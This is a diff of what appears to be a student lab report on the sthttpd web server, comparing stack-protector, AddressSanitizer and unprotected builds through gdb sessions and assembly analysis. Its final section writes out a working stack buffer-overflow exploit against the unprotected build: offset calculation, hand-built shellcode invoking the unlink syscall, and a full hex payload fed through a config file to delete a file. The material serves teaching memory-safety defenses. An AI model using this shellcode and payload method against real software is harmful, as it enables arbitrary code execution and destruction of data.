@@ -158,9 +158,15 @@ Breakpoint 1, read_config (filename=<optimized out>) at thttpd.c:1189
 1190        }
 => 0x0000000000405051 <read_config+1521>:   e8 5a d4 ff ff  callq  0x4024b0 <__stack_chk_fail@plt>
 
-This seems to indicate that we have detected that we have a buffer overrun when
-the program compares the stack protection canary to what the value should have been, and
-so the jne command handles the fact that we have a buffer overflow.
+I made this program crash with a config file who's string was too large to handle.
+Stack protection places a canary onto the stack just before the function return
+address was pushed on.  When a buffer overflow happens, it the canary will have
+been changed, and thus causes a crash.  The xor call above compares the canary
+to what the value should have been.  If it is different, the jne command is
+called and the __stack_chk_fail@plt function is called and the program aborts.
+Because the string from the config file was too long, it overrode the canary
+protection and so next time the canary was checked, it failed the check and a
+segmentation fault happened.
 
 
 6)
@@ -295,10 +301,14 @@ gdb src/thttpd-as
    0x00000000004e0b51 <read_config+193>:        48 85 c0        test   %rax,%rax
    0x00000000004e0b54 <read_config+196>:        74 24   je     0x4e0b7a <read_config+234>
 
-We see that the interceptor_strchr function has been called, which is where
-address sanitation takes place and the function throws a stack overflow error,
-which is where the function read_config and crashes the program. 
-
+I made this program crash with a config file who's string was too large to handle.
+Addreess Sanitation places checks on shadow memory, which stores metadata about
+each piece of memory.  It can determine from this shadow memory if certain
+pieces of memory are safe to access, and it "poisons" other memory zones if they
+are not safe to be accessed.  If this poisoned memory has been accessed, then
+address sanitation calls the __interceptor_strchr function and aborts the
+program.  Because our string from the config file was too long, it was placed
+into a piece of memory that was considered poisoned, and so when it was accessed
 
 7) 
 gdb src/thttpd-no
@@ -410,8 +420,12 @@ Program received signal SIGSEGV, Segmentation fault.
 Program terminated with signal SIGSEGV, Segmentation fault.
 The program no longer exists.
 
-The program read incorrect memory and crashed, which manifested as a
-Segmentation fault.  
+I made this program crash with a config file who's string was too large to handle.
+There were no checks on the stack or within the memory to prevent this program
+from reaching the return statement in the read_config function.  As such,
+because the string was too long, it overrode the return address and tried to
+execute some code that was not executable. As such, the program crashed with a
+Segmentation fault.
 
 8)
 
@@ -431,19 +445,160 @@ These are the commands I used to make the assembly files
 
 thttpd-sp.s has arounc 4.4k lines.  thttpd-sp works by placing "canaries" on
 both sides of the buffer and will call a function to check whether this buffer
-has been broken.  If it has, it will output an error.  However, this check
-occurs outside the function handle_read, so it seems as though that function was
-not affected by the stack protection.
+has been broken.  If it was broken (in our case by a string that was too long), 
+it will output an error.  However, this check occurs outside the function
+handle_read but rather in the read_config function at the very end when it calls
+__stack_chk_fail().   Because of this, handle_read was not affected by stack
+protection. This prevents buffer over-flow exploits by preventing the
+return statement from executing arbitrary code that came about because the
+string was too long.  
 
 thttpd-as.s has around 9.6k lines, which is more than double of thttpd-sp.s.
 thttpd-as version of handle_read is much larger than thttpd.sp, which suggests
-that thttpd-as does many more checks to ensure memory does not overflow. It 
-checks for shadow memories, and if shadow memory has been poisoned it will 
+that thttpd-as does many more checks to ensure memory does not overflow. After
+each memory access, it has to check with the shadow memory to determine if the
+memory is safe to access, which explains the large amount of machine code that
+was generated. If shadow memory has been poisoned it will 
 call the function __asan_report_loadn or __asan_report_storen, which puts out 
-the error that a stack overflow has occured.  
+the error that a stack overflow has occured.  Address sanitation will cover more
+memory checks, as it checks it much more often rather than at the end of a
+function.  Address sanitation prevents buffer overrun exploits by checking if an
+instruction was memory safe, and if was not kill the program, so there is
+absolutely no chance of malicious code being executed that was injected with the
+string that was too long.  
 
 thttpd-no.s also has around 4.4k lines, which suggests it is not much different
 from thttpd-sp.  In fact, the handle_read functions for both are exactly the
-same.  thttpd-sp only protects character arrays, variable addresses, and 
-registers, none of which is affected in handle_read, so handle_read function
-should not be changed.  
+same.  There are no memory checks to speak of, and so only crashes when it
+reaches a return address from which it cannot execute code.  The following
+exploit relies on the fact it will reach the return statement and attempt to
+execute whatever is in that code.  When the return statement cannot be executed,
+it will crash.
+
+9)
+Exploit!!!
+
+gdb src/thttpd-no
+(gdb) break read_config
+(gdb) r -p 12606 -D -C config.txt
+Breakpoint 1, read_config (filename=0x7fffffffe4f2 "config.txt") at
+thttpd.c:1000
+1000        {
+(gdb) p &line
+$1 = (char (*)[100]) 0x7fffffffcec0
+(gdb) info r
+rax            0x5      5
+rbx            0x7fffffffe4ef   140737488348399
+rcx            0x0      0
+rdx            0x2      2
+rsi            0x7fffffffe4f2   140737488348402
+rdi            0x7fffffffe4f2   140737488348402
+rbp            0x5      0x5
+rsp            0x7fffffffcf58   0x7fffffffcf58
+r8             0x0      0
+r9             0xd      13
+r10            0xfffffffffffff4fd       -2819
+r11            0x7ffff7710570   140737344767344
+r12            0x40ec66 4254822
+r13            0x6      6
+r14            0x7fffffffe1f8   140737488347640
+r15            0x5      5
+rip            0x4048e0 0x4048e0 <read_config>
+eflags         0x202    [ IF ]
+cs             0x33     51
+ss             0x2b     43
+ds             0x0      0
+es             0x0      0
+fs             0x0      0
+gs             0x0      0
+
+Here we have found two important things:  The address of line, where text from
+the config file goes into to, and the return address of rsp, since this is the
+very beginning of the function
+&line = 0x7fffffffcec0
+%rsp = 0x7fffffffcf58
+diff = 0x7fffffffcec0 - 0x7fffffffcf58 = 152
+
+Next I created a simple file in c to obtain the hex code for "target.txt"
+test.c:
+int main(){
+    char s[11] = "target.txt";
+    return 0;
+}
+By viewing the file in assembly, we can determine the hex code for "target.txt"
+is 7461 7267 6574 2e74 7874 0a.  Target.txt is 11 bytes long, and we want to
+place it directly after 
+
+(gdb) disas /r unlink
+Dump of assembler code for function unlink:
+   0x00007ffff76c7330 <+0>:     b8 57 00 00 00  mov    $0x57,%eax
+   0x00007ffff76c7335 <+5>:     0f 05   syscall
+   0x00007ffff76c7337 <+7>:     48 3d 01 f0 ff ff       cmp    $0xfffffffffffff001,%rax
+   0x00007ffff76c733d <+13>:    73 01   jae    0x7ffff76c7340 <unlink+16>
+   0x00007ffff76c733f <+15>:    c3      retq
+   0x00007ffff76c7340 <+16>:    48 8b 0d 21 fb 2c 00    mov    0x2cfb21(%rip),%rcx        # 0x7ffff7996e68
+   0x00007ffff76c7347 <+23>:    f7 d8   neg    %eax
+   0x00007ffff76c7349 <+25>:    64 89 01        mov    %eax,%fs:(%rcx)
+   0x00007ffff76c734c <+28>:    48 83 c8 ff     or     $0xffffffffffffffff,%rax
+   0x00007ffff76c7350 <+32>:    c3      retq
+End of assembler dump.
+
+Unlink is the function in C that can be called to delete files.
+The function places 87 into rax, and then calls the syscall function
+Now that we know how unlink works in machine code, we can write some assembly code ourselves
+so we can see the byte code needed to move the string "target.txt" into unlink
+for it to be deleted.  I write a file called move.s myself. 7fffffffcf48 comes from 
+the return address 7fffffffcf58 - 11 (number of bytes from "target.txt") - 5. 
+
+move.s:
+movq    $0x7fffffffcf48, %rdi
+movq    $0x57, %rax
+syscall
+
+Compile it and disassemble it with the following
+gcc -c move.s
+objdump -d move.o
+
+move.o disassembled:
+ 0:   48 bf 48 cf ff ff ff    movabs $0x7fffffffcf48,%rdi
+ 7:   7f 00 00
+ a:   48 c7 c0 57 00 00 00    mov    $0x57,%rax
+11:   0f 05
+
+We have just generated the byte code that will delete the file.
+48 bf 48 cf ff ff ff 7f 00 00 48 c7 c0 57 00 00 00 0f 05
+
+We have 152 bytes to work with from the beginning of &line, which means we
+really are dealing with 160 bytes.  At the beginning of our hex code, we will
+put the code to delete the target.txt., and at the end, we will put the name of
+the text file, target.txt, which will be fed into unlink.  
+
+00 00 00 48 bf 48 cf ff ff ff 7f 00 00 48 c7 c0 57 
+00 00 00 0f 05 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 74 61 72 67 65 
+74 2e 74 78 74 00 00 00 00 00 00 c8 ce ff ff ff 7f 00 00
+
+There are 111 zero bytes in between to make it 155 bytes.  We reserve 5 bytes
+for "port=", which the config file requires.  We transform the above from hex
+code to ascii code, then add on "port=", which is what the spec for a congif
+file requires.
+
+Now we crash the src/thttpd-no and delete the target.txt file
+
+gdb src/thttpd-no.  raw.txt contains "port=hex..."
+(gdb) r -p 12606 -D -C raw.txt
+Starting program: /w/home.11/cs/ugrad/chuen/sthttpd-2.27.0/src/thttpd-no -p
+12606 -D -C raw.txt
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib64/libthread_db.so.1".
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00007fffffffcedb in ?? ()
+
+Afterwards, we can check that the target.txt file has been deleted, which
+completes this exploit. 
